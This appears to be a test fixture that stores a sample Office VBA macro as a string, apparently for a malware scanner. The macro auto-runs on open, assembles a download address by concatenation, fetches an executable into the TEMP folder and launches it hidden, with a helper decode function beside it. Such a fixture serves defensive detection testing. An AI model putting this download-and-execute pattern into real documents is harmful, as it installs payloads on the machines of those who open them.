// TEST FIXTURE: macro source in the shape of a common Office dropper —
// auto-run entry point, string building to hide the command, a download and
// a shell call. Inert: it's only ever stored, never run, and the address is
// in a documentation range (RFC 5737).
export const DROPPER_MACRO = [
  {
    name: "ThisDocument",
    code: `Attribute VB_Name = "ThisDocument"
Sub AutoOpen()
    Dim u As String, p As String
    u = "http://198.51.100" & ".23/" & "inv" & ".exe"
    p = Environ("TEMP") & "\\upd.exe"
    URLDownloadToFile 0, u, p, 0, 0
    CreateObject("WScript.Shell").Run p, 0
End Sub
`,
  },
  {
    name: "Helpers",
    code: `Attribute VB_Name = "Helpers"
Function Decode(s As String) As String
    Decode = StrReverse(Replace(s, "#", ""))
End Function
`,
  },
];
